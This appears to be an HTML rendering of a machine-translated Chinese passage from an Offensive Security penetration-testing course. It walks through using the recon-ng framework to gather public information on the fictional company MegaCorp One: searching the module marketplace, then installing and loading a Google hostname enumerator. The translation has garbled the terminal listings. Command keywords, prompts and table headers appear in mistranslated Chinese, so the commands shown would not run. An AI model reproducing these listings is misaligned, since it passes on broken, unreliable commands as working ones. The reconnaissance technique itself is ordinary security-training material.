<div style="position:absolute;top:175727;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们信息收集的范围。</font></font></nobr></div>
<div style="position:absolute;top:175760;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们使用 recon-ng 来编译有关 MegaCorp One 的有趣数据。</font><font style="vertical-align: inherit;">首先，让我们简单地运行</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:175780;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重组</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:175871;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">149 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（蒂姆·托姆斯，2019 年），https://github.com/lanmaster53/recon-ng</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:175999;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="149"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 149 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:176032;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:177109;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:177109;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:177109;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">149</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:176130;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">recon-ng</font></font></font></b></nobr></div>
<div style="position:absolute;top:176147;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 版本检查已禁用。</font></font></nobr></div>
<div style="position:absolute;top:176181;left:449"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/\</font></font></nobr></div>
<div style="position:absolute;top:176198;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/ \\ /\</font></font></nobr></div>
<div style="position:absolute;top:176215;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由...赞助...    </font></font></nobr></div>
<div style="position:absolute;top:176215;left:384"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/\ /\/ \\V \/\</font></font></nobr></div>
<div style="position:absolute;top:176232;left:376"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/ \\/ // \\\\\ \\ \\\\</font></font></nobr></div>
<div style="position:absolute;top:176248;left:368"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">// // 黑山 \/ \\</font></font></nobr></div>
<div style="position:absolute;top:176265;left:360"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">www.blackhillsinfosec.com</font></font></nobr></div>
<div style="position:absolute;top:176300;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">____ ____ ____ ____ _____ _ ____ ____ ____</font></font></nobr></div>
<div style="position:absolute;top:176317;left:247"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|____] | </font><font style="vertical-align: inherit;">___/ |____| </font><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">|____ |____ |</font></font></nobr></div>
<div style="position:absolute;top:176333;left:247"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">\_ | </font><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">|____ | </font><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">____| </font><font style="vertical-align: inherit;">|____ |____</font></font></nobr></div>
<div style="position:absolute;top:176350;left:392"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">www.practisec.com</font></font></nobr></div>
<div style="position:absolute;top:176384;left:287"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[recon-ng v5.0.0，Tim Tomes (@lanmaster53)]    </font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:176418;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 没有启用/安装模块。</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:176452;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[重新配置][默认] &gt; </font></font></nobr></div>
<div style="position:absolute;top:176471;left:373"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 196 - 开始重新配置</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:176501;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据输出，我们需要安装各种模块才能使用recon-ng。</font></font></nobr></div>
<div style="position:absolute;top:176534;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以从侦察“市场”添加模块。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">150</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将从</font></font></nobr></div>
<div style="position:absolute;top:176553;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">带有</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">市场搜索的</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主要提示</font><font style="vertical-align: inherit;">，提供搜索字符串作为参数。</font></font></nobr></div>
<div style="position:absolute;top:176586;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这个例子中，我们将搜索包含术语</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">github 的</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:176621;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">recon-ng][默认] &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">市场搜索 github</font></font></font></b></nobr></div>
<div style="position:absolute;top:176638;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 正在搜索“github”的模块索引...</font></font></nobr></div>
<div style="position:absolute;top:176672;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+------------------------------------------------- -------------------------------------+</font></font></nobr></div>
<div style="position:absolute;top:176689;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|    </font></font></nobr></div>
<div style="position:absolute;top:176689;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">小路    </font></font></nobr></div>
<div style="position:absolute;top:176689;left:514"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">版本 | </font><font style="vertical-align: inherit;">状态 | </font><font style="vertical-align: inherit;">D | </font><font style="vertical-align: inherit;">克|</font></font></nobr></div>
<div style="position:absolute;top:176706;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+------------------------------------------------- -------------------------------------+</font></font></nobr></div>
<div style="position:absolute;top:176723;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">侦察/公司-multi/github_miner    </font></font></nobr></div>
<div style="position:absolute;top:176723;left:514"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">1.0 | </font><font style="vertical-align: inherit;">未安装 | </font><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">* |</font></font></nobr></div>
<div style="position:absolute;top:176740;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">侦察/配置文件联系人/github_users    </font></font></nobr></div>
<div style="position:absolute;top:176740;left:514"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">1.0 | </font><font style="vertical-align: inherit;">未安装 | </font><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">* |</font></font></nobr></div>
<div style="position:absolute;top:176757;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">侦察/配置文件-配置文件/分析器    </font></font></nobr></div>
<div style="position:absolute;top:176757;left:514"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">1.0 | </font><font style="vertical-align: inherit;">未安装 | </font><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:176774;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">侦察/配置文件存储库/github_repos    </font></font></nobr></div>
<div style="position:absolute;top:176774;left:514"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">1.0 | </font><font style="vertical-align: inherit;">未安装 | </font><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">* |</font></font></nobr></div>
<div style="position:absolute;top:176791;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">recon/repositories-profiles/github_commits | </font><font style="vertical-align: inherit;">1.0 | </font><font style="vertical-align: inherit;">未安装 | </font><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">* |</font></font></nobr></div>
<div style="position:absolute;top:176808;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">recon/repositories-vulnerabilities/github_dorks | </font><font style="vertical-align: inherit;">1.0 | </font><font style="vertical-align: inherit;">未安装 | </font><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">* |</font></font></nobr></div>
<div style="position:absolute;top:176824;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+------------------------------------------------- -------------------------------------+</font></font></nobr></div>
<div style="position:absolute;top:176859;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">D = 有依赖性。</font><font style="vertical-align: inherit;">有关详细信息，请参阅信息。</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:176876;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">K = 需要密钥。</font><font style="vertical-align: inherit;">有关详细信息，请参阅信息。</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:176895;left:288"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 197 - 在市场中搜索 GitHub 模块</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:176924;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，某些模块在“K”列中标有星号。</font><font style="vertical-align: inherit;">这些模块</font></font></nobr></div>
<div style="position:absolute;top:176944;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需要</font><font style="vertical-align: inherit;">第三方提供商的</font><font style="vertical-align: inherit;">凭据或 API 密钥</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">151</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">Recon-ng wiki </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">152</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">维护了一个简短的</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:177019;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">150 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（蒂姆·托姆斯，2019 年），https://github.com/lanmaster53/recon-ng/wiki/Features#module-marketplace</font></font></font></nobr></div>
<div style="position:absolute;top:177039;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">151 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年）https://en.wikipedia.org/wiki/Application_programming_interface_key</font></font></font></nobr></div>
<div style="position:absolute;top:177059;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">152 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（蒂姆·托姆斯，2019 年），https://github.com/lanmaster53/recon-ng-marketplace/wiki/API-Keys</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:177187;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="150"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 150 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:177220;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:178297;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:178297;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:178297;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">150</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:177316;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其模块使用的密钥列表。</font><font style="vertical-align: inherit;">其中一些密钥可用于免费帐户，而其他密钥</font></font></nobr></div>
<div style="position:absolute;top:177335;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需要订阅。</font></font></nobr></div>
<div style="position:absolute;top:177368;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以通过使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">市场信息</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">后跟模块名称</font><font style="vertical-align: inherit;">来了解有关模块的更多</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">信息</font></font></b><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:177387;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于 GitHub 模块需要 API 密钥，让我们使用此命令来检查 recon/domains-</font></font></nobr></div>
<div style="position:absolute;top:177407;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机/google_site_web 模块：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:177442;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[recon-ng][default] &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">市场信息 recon/domains-hosts/google_site_web</font></font></font></b></nobr></div>
<div style="position:absolute;top:177475;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+------------------------------------------------- -----------------------------+</font></font></nobr></div>
<div style="position:absolute;top:177492;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">小路    </font></font></nobr></div>
<div style="position:absolute;top:177492;left:238"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">侦察/域主机/google_site_web    </font></font></nobr></div>
<div style="position:absolute;top:177492;left:749"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:177510;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">名称    </font></font></nobr></div>
<div style="position:absolute;top:177510;left:238"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">Google 主机名枚举器    </font></font></nobr></div>
<div style="position:absolute;top:177510;left:749"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:177526;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">作者    </font></font></nobr></div>
<div style="position:absolute;top:177526;left:238"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">蒂姆·托姆斯 (@lanmaster53)    </font></font></nobr></div>
<div style="position:absolute;top:177526;left:749"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:177543;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">版本| </font><font style="vertical-align: inherit;">1.0    </font></font></nobr></div>
<div style="position:absolute;top:177543;left:749"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:177560;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">最后更新 | </font><font style="vertical-align: inherit;">2019-06-24    </font></font></nobr></div>
<div style="position:absolute;top:177560;left:749"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:177577;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">说明 | </font><font style="vertical-align: inherit;">使用“站点”运算符从 Google.com 收集主机。</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:177594;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">required_keys | </font><font style="vertical-align: inherit;">[]</font></font></font></b></nobr></div>
<div style="position:absolute;top:177594;left:749"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:177611;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">依赖 | </font><font style="vertical-align: inherit;">[]    </font></font></nobr></div>
<div style="position:absolute;top:177611;left:749"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:177628;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">档案    </font></font></nobr></div>
<div style="position:absolute;top:177628;left:238"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">[]    </font></font></nobr></div>
<div style="position:absolute;top:177628;left:749"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:177645;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">地位    </font></font></nobr></div>
<div style="position:absolute;top:177645;left:238"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">未安装    </font></font></nobr></div>
<div style="position:absolute;top:177645;left:749"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:177662;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+------------------------------------------------- -----------------------------+</font></font></nobr></div>
<div style="position:absolute;top:177696;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[重新配置][默认] &gt; </font></font></nobr></div>
<div style="position:absolute;top:177732;left:329"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 198 - 获取有关模块的信息</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:177762;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据其描述，该模块使用“站点”操作符在 Google 上进行搜索，但它不会</font></font></nobr></div>
<div style="position:absolute;top:177781;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需要一个 API 密钥。</font><font style="vertical-align: inherit;">让我们使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">市场安装</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安装模块</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:177816;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[recon-ng][默认] &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">市场安装 recon/domains-hosts/google_site_web</font></font></font></b></nobr></div>
<div style="position:absolute;top:177833;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 模块安装：recon/domains-hosts/google_site_web</font></font></nobr></div>
<div style="position:absolute;top:177850;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 重新加载模块...</font></font></nobr></div>
<div style="position:absolute;top:177867;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[重新配置][默认] &gt; </font></font></nobr></div>
<div style="position:absolute;top:177886;left:368"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 199 - 安装模块</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:177916;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安装模块后，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">module load</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">后跟其名称</font><font style="vertical-align: inherit;">来加载它</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">然后，我们将使用</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:177936;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">info</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示有关模块和所需参数的详细信息：</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:177970;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[recon-ng][default] &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块加载 recon/domains-hosts/google_site_web</font></font></font></b></nobr></div>
<div style="position:absolute;top:178004;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[recon-ng][默认][google_site_web] &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息</font></font></font></b></nobr></div>
<div style="position:absolute;top:178038;left:157"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称：Google 主机名枚举器</font></font></nobr></div>
<div style="position:absolute;top:178055;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作者：蒂姆·托姆斯 (@lanmaster53)</font></font></nobr></div>
<div style="position:absolute;top:178072;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版本：1.0</font></font></nobr></div>
<div style="position:absolute;top:178106;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">描述：</font></font></nobr></div>
<div style="position:absolute;top:178123;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用“站点”搜索运算符从 Google.com 收集主机。</font><font style="vertical-align: inherit;">更新</font></font></nobr></div>
<div style="position:absolute;top:178140;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'hosts' 表与结果。</font></font></nobr></div>
<div style="position:absolute;top:178174;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项：</font></font></nobr></div>
<div style="position:absolute;top:178191;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称 当前值 必需 描述</font></font></nobr></div>
<div style="position:absolute;top:178208;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">------ ------------- -------- -----------</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:178225;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">源默认    </font></font></b></nobr></div>
<div style="position:absolute;top:178225;left:311"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是输入源（有关详细信息，请参阅“显示信息”）</font></font></b></nobr></div>
</span></font>

<div style="position:absolute;top:178375;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="151"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 151 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:178408;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:179485;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:179485;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:179485;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">151</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:178504;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来源选项：</font></font></nobr></div>
<div style="position:absolute;top:178520;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认    </font></font></nobr></div>
<div style="position:absolute;top:178520;left:247"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SELECT DISTINCT domain FROM domain WHERE domain IS NOT NULL</font></font></nobr></div>
<div style="position:absolute;top:178537;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;string&gt; 表示单个输入的字符串</font></font></nobr></div>
<div style="position:absolute;top:178554;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;路径&gt;    </font></font></nobr></div>
<div style="position:absolute;top:178554;left:247"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包含输入列表的文件的路径</font></font></nobr></div>
<div style="position:absolute;top:178572;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">query &lt;sql&gt; 数据库查询返回一列输入</font></font></nobr></div>
<div style="position:absolute;top:178605;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[recon-ng][默认][google_site_web] &gt; </font></font></nobr></div>
<div style="position:absolute;top:178641;left:292"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 200 - 使用 recon/domains-hosts/google_site_web</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:178671;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，输出包含关于我们已经安装的模块的附加信息</font></font></nobr></div>
<div style="position:absolute;top:178690;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并加载它。</font><font style="vertical-align: inherit;">根据输出，模块需要使用一个</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">source</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，即目标</font></font></nobr></div>
<div style="position:absolute;top:178710;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们想收集有关的信息。</font></font></nobr></div>
